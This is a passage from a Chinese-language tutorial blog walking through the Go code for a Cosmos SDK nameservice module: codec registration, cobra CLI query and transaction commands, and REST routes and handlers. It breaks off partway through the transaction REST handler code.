<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> types</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/codec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// RegisterCodec registers concrete types on codec</span></span><br><span class="line"><span class="comment">// codec上注册具体的类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RegisterCodec</span><span class="params">(cdc *codec.Codec)</span></span> &#123;</span><br><span class="line">	<span class="comment">// this line is used by starport scaffolding # 1</span></span><br><span class="line">	cdc.RegisterConcrete(MsgBuyName&#123;&#125;, <span class="string">&quot;cosmosnameservice/BuyName&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	cdc.RegisterConcrete(MsgSetName&#123;&#125;, <span class="string">&quot;cosmosnameservice/SetName&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	cdc.RegisterConcrete(MsgDeleteName&#123;&#125;, <span class="string">&quot;cosmosnameservice/DeleteName&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ModuleCdc defines the module codec</span></span><br><span class="line"><span class="keyword">var</span> ModuleCdc *codec.Codec</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 创建实例codec</span></span><br><span class="line">	ModuleCdc = codec.New()</span><br><span class="line">	RegisterCodec(ModuleCdc)</span><br><span class="line">	<span class="comment">// Register the go-crypto to the codec</span></span><br><span class="line">	<span class="comment">// 注册加密函数信息</span></span><br><span class="line">	codec.RegisterCrypto(ModuleCdc)</span><br><span class="line">	<span class="comment">// 封装</span></span><br><span class="line">	ModuleCdc.Seal()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Nameservice模块的CLI:</h1>
<p>Cosmos SDK使用<code>cobra</code>库进行CLI交互。该库使每个模块都可以轻松地显示自己的操作命令。<br />
要开始定义用户与模块的CLI交互，请创建以下文件:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>./x/cosmosnameservice/client/cli/queryWhois.go</code></p>
</li>
<li class="lvl-2">
<p><code>./x/cosmosnameservice/client/cli/txWhois.go</code></p>
</li>
</ul>
<h2 id="Queries">Queries:</h2>
<p>实现查询的客户端命令逻辑:</p>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/client/cli/queryWhois.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cli</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/client/context&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/codec&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/types&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/spf13/cobra&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有的whois</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCmdListWhois</span><span class="params">(queryRoute <span class="type">string</span>, cdc *codec.Codec)</span></span> *cobra.Command &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;cobra.Command&#123;</span><br><span class="line">		Use:   <span class="string">&quot;list-whois&quot;</span>,     <span class="comment">// 使用的命令</span></span><br><span class="line">		Short: <span class="string">&quot;list all whois&quot;</span>, <span class="comment">// 介绍</span></span><br><span class="line">		<span class="comment">// 运行的内容</span></span><br><span class="line">		RunE: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">			cliCtx := context.NewCLIContext().WithCodec(cdc)</span><br><span class="line">			res, _, err := cliCtx.QueryWithData(fmt.Sprintf(<span class="string">&quot;custom/%s/%s&quot;</span>, queryRoute, types.QueryListWhois), <span class="literal">nil</span>)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				fmt.Printf(<span class="string">&quot;could not list Whois\n%s\n&quot;</span>, err.Error())</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">var</span> out []types.Whois</span><br><span class="line">			<span class="comment">// 解码结果放到out中</span></span><br><span class="line">			cdc.MustUnmarshalJSON(res, &amp;out)</span><br><span class="line">			<span class="keyword">return</span> cliCtx.PrintOutput(out)</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一个whois</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCmdGetWhois</span><span class="params">(queryRoute <span class="type">string</span>, cdc *codec.Codec)</span></span> *cobra.Command &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;cobra.Command&#123;</span><br><span class="line">		Use:   <span class="string">&quot;get-whois [key]&quot;</span>,</span><br><span class="line">		Short: <span class="string">&quot;Query a whois by key&quot;</span>,</span><br><span class="line">		Args:  cobra.ExactArgs(<span class="number">1</span>), <span class="comment">// 参数对应key</span></span><br><span class="line">		RunE: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">			cliCtx := context.NewCLIContext().WithCodec(cdc)</span><br><span class="line">			key := args[<span class="number">0</span>] <span class="comment">// 获取命令中的key</span></span><br><span class="line">			res, _, err := cliCtx.QueryWithData(fmt.Sprintf(<span class="string">&quot;custom/%s/%s/%s&quot;</span>, queryRoute, types.QueryGetWhois, key), <span class="literal">nil</span>)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				fmt.Printf(<span class="string">&quot;could not resolve whois %s \n%s\n&quot;</span>, key, err.Error())</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">var</span> out types.Whois</span><br><span class="line">			cdc.MustUnmarshalJSON(res, &amp;out)</span><br><span class="line">			<span class="keyword">return</span> cliCtx.PrintOutput(out)</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetCmdResolveName queries information about a name</span></span><br><span class="line"><span class="comment">// 查询域名的解析值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCmdResolveName</span><span class="params">(queryRoute <span class="type">string</span>, cdc *codec.Codec)</span></span> *cobra.Command &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;cobra.Command&#123;</span><br><span class="line">		Use:   <span class="string">&quot;resolve [name]&quot;</span>,</span><br><span class="line">		Short: <span class="string">&quot;resolve name&quot;</span>,</span><br><span class="line">		Args:  cobra.ExactArgs(<span class="number">1</span>),</span><br><span class="line">		RunE: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">			cliCtx := context.NewCLIContext().WithCodec(cdc)</span><br><span class="line">			name := args[<span class="number">0</span>]</span><br><span class="line">			res, _, err := cliCtx.QueryWithData(fmt.Sprintf(<span class="string">&quot;custom/%s/%s/%s&quot;</span>, queryRoute, types.QueryResolveName, name), <span class="literal">nil</span>)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				fmt.Printf(<span class="string">&quot;could not resolve name - %s \n&quot;</span>, name)</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">var</span> out types.QueryResResolve</span><br><span class="line">			cdc.MustUnmarshalJSON(res, &amp;out)</span><br><span class="line">			<span class="keyword">return</span> cliCtx.PrintOutput(out)</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意上述代码中：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>CLI 引入了一个新的<code>context:CLIContext</code>。它包含有关CLI交互所需的用户输入和应用程序配置的数据。</p>
</li>
<li class="lvl-2">
<p><code>cliCtx.QueryWithData()</code>函数所需的<code>path</code>直接从你的查询路径中映射。</p>
<ul class="lvl-2">
<li class="lvl-6">路径的第一部分用于区分 SDK 应用程序可能的querier类型：custom用于Querier。</li>
<li class="lvl-6">第二部分（<code>nameservice</code>）是将查询路由到的模块的名称。</li>
<li class="lvl-6">最后是要调用模块中的特定的<code>querier</code>。</li>
<li class="lvl-6">在这个例子中，第四部分是查询。这是因为查询参数是一个简单的字符串。要启用更复杂的查询输入，你需要使用<code>.QueryWithData()</code>函数的第二个参数来传入<code>data</code>。</li>
</ul>
</li>
</ul>
<p>继续在<code>cli/query.go</code>中添加子命令:</p>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/client/cli/query.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cli</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="comment">// &quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/spf13/cobra&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/client&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/client/flags&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// &quot;github.com/cosmos/cosmos-sdk/client/context&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/codec&quot;</span></span><br><span class="line">	<span class="comment">// sdk &quot;github.com/cosmos/cosmos-sdk/types&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/types&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetQueryCmd returns the cli query commands for this module</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetQueryCmd</span><span class="params">(queryRoute <span class="type">string</span>, cdc *codec.Codec)</span></span> *cobra.Command &#123;</span><br><span class="line">	<span class="comment">// Group nameservice queries under a subcommand</span></span><br><span class="line">	nameserviceQueryCmd := &amp;cobra.Command&#123;</span><br><span class="line">		Use:                        types.ModuleName,</span><br><span class="line">		Short:                      fmt.Sprintf(<span class="string">&quot;Querying commands for the %s module&quot;</span>, types.ModuleName),</span><br><span class="line">		DisableFlagParsing:         <span class="literal">true</span>,</span><br><span class="line">		SuggestionsMinimumDistance: <span class="number">2</span>,</span><br><span class="line">		RunE:                       client.ValidateCmd,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	nameserviceQueryCmd.AddCommand(</span><br><span class="line">		flags.GetCommands(</span><br><span class="line">			<span class="comment">// this line is used by starport scaffolding # 1</span></span><br><span class="line">			GetCmdListWhois(queryRoute, cdc),</span><br><span class="line">			GetCmdGetWhois(queryRoute, cdc),</span><br><span class="line">			<span class="comment">// 注意一定添加这个命令, 不然的话使用命令行测试时resolve命令无法解析!!!</span></span><br><span class="line">			GetCmdResolveName(queryRoute, cdc),</span><br><span class="line">		)...,</span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> nameserviceQueryCmd</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Transaction">Transaction:</h2>
<p>接下来实现交易命令的客户端。</p>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/client/cli/txWhois.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cli</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bufio&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/spf13/cobra&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/client/context&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/codec&quot;</span></span><br><span class="line">	sdk <span class="string">&quot;github.com/cosmos/cosmos-sdk/types&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/x/auth&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/x/auth/client/utils&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/types&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 购买新域名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCmdBuyName</span><span class="params">(cdc *codec.Codec)</span></span> *cobra.Command &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;cobra.Command&#123;</span><br><span class="line">		Use:   <span class="string">&quot;buy-name [name] [price]&quot;</span>,</span><br><span class="line">		Short: <span class="string">&quot;Buys a new name&quot;</span>,</span><br><span class="line">		Args:  cobra.ExactArgs(<span class="number">2</span>),</span><br><span class="line">		RunE: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">			argsName := <span class="type">string</span>(args[<span class="number">0</span>]) <span class="comment">//获取购买的名字name</span></span><br><span class="line"></span><br><span class="line">			cliCtx := context.NewCLIContext().WithCodec(cdc)</span><br><span class="line">			<span class="comment">// 获取标准读入</span></span><br><span class="line">			inBuf := bufio.NewReader(cmd.InOrStdin())</span><br><span class="line">			<span class="comment">// 创建交易创建器</span></span><br><span class="line">			txBldr := auth.NewTxBuilderFromCLI(inBuf).WithTxEncoder(utils.GetTxEncoder(cdc))</span><br><span class="line"></span><br><span class="line">			coins, err := sdk.ParseCoins(args[<span class="number">1</span>]) <span class="comment">//解析出价</span></span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> err</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 构建NewMsgBuyName实例</span></span><br><span class="line">			msg := types.NewMsgBuyName(argsName, coins, cliCtx.GetFromAddress())</span><br><span class="line">			<span class="comment">// 做基本的验证</span></span><br><span class="line">			err = msg.ValidateBasic()</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> err</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 生成或广播交易</span></span><br><span class="line">			<span class="keyword">return</span> utils.GenerateOrBroadcastMsgs(cliCtx, txBldr, []sdk.Msg&#123;msg&#125;)</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置域名解析</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCmdSetWhois</span><span class="params">(cdc *codec.Codec)</span></span> *cobra.Command &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;cobra.Command&#123;</span><br><span class="line">		Use:   <span class="string">&quot;set-name [value] [name]&quot;</span>,</span><br><span class="line">		Short: <span class="string">&quot;Set a new name&quot;</span>,</span><br><span class="line">		Args:  cobra.ExactArgs(<span class="number">2</span>),</span><br><span class="line">		RunE: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">			argsValue := args[<span class="number">0</span>]</span><br><span class="line">			argsName := args[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">			cliCtx := context.NewCLIContext().WithCodec(cdc)</span><br><span class="line">			inBuf := bufio.NewReader(cmd.InOrStdin())</span><br><span class="line">			txBldr := auth.NewTxBuilderFromCLI(inBuf).WithTxEncoder(utils.GetTxEncoder(cdc))</span><br><span class="line">			msg := types.NewMsgSetName(argsName, argsValue, cliCtx.GetFromAddress())</span><br><span class="line">			err := msg.ValidateBasic()</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> err</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> utils.GenerateOrBroadcastMsgs(cliCtx, txBldr, []sdk.Msg&#123;msg&#125;)</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除一个域名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCmdDeleteWhois</span><span class="params">(cdc *codec.Codec)</span></span> *cobra.Command &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;cobra.Command&#123;</span><br><span class="line">		Use:   <span class="string">&quot;delete-name [id]&quot;</span>,</span><br><span class="line">		Short: <span class="string">&quot;Delete a new name by ID&quot;</span>,</span><br><span class="line">		Args:  cobra.ExactArgs(<span class="number">1</span>),</span><br><span class="line">		RunE: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"></span><br><span class="line">			cliCtx := context.NewCLIContext().WithCodec(cdc)</span><br><span class="line">			inBuf := bufio.NewReader(cmd.InOrStdin())</span><br><span class="line">			txBldr := auth.NewTxBuilderFromCLI(inBuf).WithTxEncoder(utils.GetTxEncoder(cdc))</span><br><span class="line"></span><br><span class="line">			msg := types.NewMsgDeleteName(args[<span class="number">0</span>], cliCtx.GetFromAddress())</span><br><span class="line">			err := msg.ValidateBasic()</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> err</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> utils.GenerateOrBroadcastMsgs(cliCtx, txBldr, []sdk.Msg&#123;msg&#125;)</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/client/cli/tx.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cli</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/spf13/cobra&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/client&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/client/flags&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/codec&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/types&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetTxCmd returns the transaction commands for this module</span></span><br><span class="line"><span class="comment">// 返回模块的交易命令</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetTxCmd</span><span class="params">(cdc *codec.Codec)</span></span> *cobra.Command &#123;</span><br><span class="line">	nameserviceTxCmd := &amp;cobra.Command&#123;</span><br><span class="line">		Use:                        types.ModuleName,</span><br><span class="line">		Short:                      fmt.Sprintf(<span class="string">&quot;%s transactions subcommands&quot;</span>, types.ModuleName),</span><br><span class="line">		DisableFlagParsing:         <span class="literal">true</span>,</span><br><span class="line">		SuggestionsMinimumDistance: <span class="number">2</span>,</span><br><span class="line">		RunE:                       client.ValidateCmd,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 把txWhois.go中的命令都添加</span></span><br><span class="line">	nameserviceTxCmd.AddCommand(flags.PostCommands(</span><br><span class="line">		<span class="comment">// this line is used by starport scaffolding</span></span><br><span class="line">		GetCmdBuyName(cdc),</span><br><span class="line">		GetCmdSetWhois(cdc),</span><br><span class="line">		GetCmdDeleteWhois(cdc),</span><br><span class="line">	)...)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> nameserviceTxCmd</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意在上述代码中：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用了<code>authcmd</code>包,它提供对CLI控制的帐户的访问权限，并便于签名。</p>
</li>
</ul>
<h1>NameService模块的REST接口:</h1>
<p>你的模块还可以公开 REST 接口，提供程序访问模块的功能。。首先创建一个文件来保存HTTP的<code>handler</code>：</p>
<h2 id="RegisterRoutes">RegisterRoutes:</h2>
<p>首先在<code>RegisterRoutes</code>函数中为模块定义REST客户端接口。路由都以模块名称开头，以防止命名空间与其他模块的路径冲突：</p>
<blockquote>
<p>需要修改<code>./x/cosmosnameservice/client/rest/rest.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> rest</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/client/context&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// RegisterRoutes registers nameservice-related REST handlers to a router</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RegisterRoutes</span><span class="params">(cliCtx context.CLIContext, r *mux.Router)</span></span> &#123;</span><br><span class="line">	<span class="comment">// this line is used by starport scaffolding</span></span><br><span class="line">	r.HandleFunc(<span class="string">&quot;/nameservice/whois&quot;</span>, buyNameHandler(cliCtx)).Methods(<span class="string">&quot;POST&quot;</span>)</span><br><span class="line">	r.HandleFunc(<span class="string">&quot;/nameservice/whois&quot;</span>, listWhoisHandler(cliCtx, <span class="string">&quot;nameservice&quot;</span>)).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">	r.HandleFunc(<span class="string">&quot;/nameservice/whois/&#123;key&#125;&quot;</span>, getWhoisHandler(cliCtx, <span class="string">&quot;nameservice&quot;</span>)).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">	r.HandleFunc(<span class="string">&quot;/nameservice/whois/&#123;key&#125;/resolve&quot;</span>, resolveNameHandler(cliCtx, <span class="string">&quot;nameservice&quot;</span>)).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">	r.HandleFunc(<span class="string">&quot;/nameservice/whois&quot;</span>, setWhoisHandler(cliCtx)).Methods(<span class="string">&quot;PUT&quot;</span>)</span><br><span class="line">	r.HandleFunc(<span class="string">&quot;/nameservice/whois&quot;</span>, deleteWhoisHandler(cliCtx)).Methods(<span class="string">&quot;DELETE&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Query-Handlers">Query Handlers:</h2>
<p>接下来，是时候定义上面提到的处理程序了。这些与前面定义的CLI方法非常相似。</p>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/client/rest/queryWhois.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> rest</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/types&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/client/context&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/types/rest&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询所有的whois</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">listWhoisHandler</span><span class="params">(cliCtx context.CLIContext, storeName <span class="type">string</span>)</span></span> http.HandlerFunc &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		res, _, err := cliCtx.QueryWithData(fmt.Sprintf(<span class="string">&quot;custom/%s/%s&quot;</span>, storeName, types.QueryListWhois), <span class="literal">nil</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusNotFound, err.Error())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		rest.PostProcessResponse(w, cliCtx, res)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一个域名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getWhoisHandler</span><span class="params">(cliCtx context.CLIContext, storeName <span class="type">string</span>)</span></span> http.HandlerFunc &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		<span class="comment">// 获取参数</span></span><br><span class="line">		vars := mux.Vars(r)</span><br><span class="line">		key := vars[<span class="string">&quot;key&quot;</span>]</span><br><span class="line"></span><br><span class="line">		res, _, err := cliCtx.QueryWithData(fmt.Sprintf(<span class="string">&quot;custom/%s/%s/%s&quot;</span>, storeName, types.QueryGetWhois, key), <span class="literal">nil</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusNotFound, err.Error())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		rest.PostProcessResponse(w, cliCtx, res)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析域名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">resolveNameHandler</span><span class="params">(cliCtx context.CLIContext, storeName <span class="type">string</span>)</span></span> http.HandlerFunc &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		vars := mux.Vars(r)</span><br><span class="line">		paramType := vars[<span class="string">&quot;key&quot;</span>]</span><br><span class="line"></span><br><span class="line">		res, _, err := cliCtx.QueryWithData(fmt.Sprintf(<span class="string">&quot;custom/%s/%s/%s&quot;</span>, storeName, types.QueryResolveName, paramType), <span class="literal">nil</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusNotFound, err.Error())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		rest.PostProcessResponse(w, cliCtx, res)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码要注意：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>我们使用相同的<code>cliCtx.QueryWithData</code>函数来获取数据</p>
</li>
<li class="lvl-2">
<p>这些函数与相应的<code>CLI</code>功能几乎相同</p>
</li>
</ul>
<h2 id="Tx-Handlers">Tx Handlers:</h2>
<p>现在定义 <code>buyName</code> 和 <code>setName</code> 交易路由。<br />
请注意，这些实际上并不能将交易发送进行买入和设置名称。 这需要跟交易请求一起发送发送密码，将是一个安全问题。<br />
相反，这些端点构建并返回每个特定交易，然后可以以安全的方式对其进行签名，然后使用标准端点（如/txs）将其广播到网络。</p>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/client/rest/txWhois.go</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> rest</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/client/context&quot;</span></span><br><span class="line">	sdk <span class="string">&quot;github.com/cosmos/cosmos-sdk/types&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/types/rest&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/x/auth/client/utils&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/types&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> buyNameRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">	BaseReq rest.BaseReq <span class="string">`json:&quot;base_req&quot;`</span> <span class="comment">// 包含了创建交易的基本的请求字段</span></span><br><span class="line">	Buyer   <span class="type">string</span>       <span class="string">`json:&quot;buyer&quot;`</span></span><br><span class="line">	Name    <span class="type">string</span>       <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	Price   <span class="type">string</span>       <span class="string">`json:&quot;price&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 购买域名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span 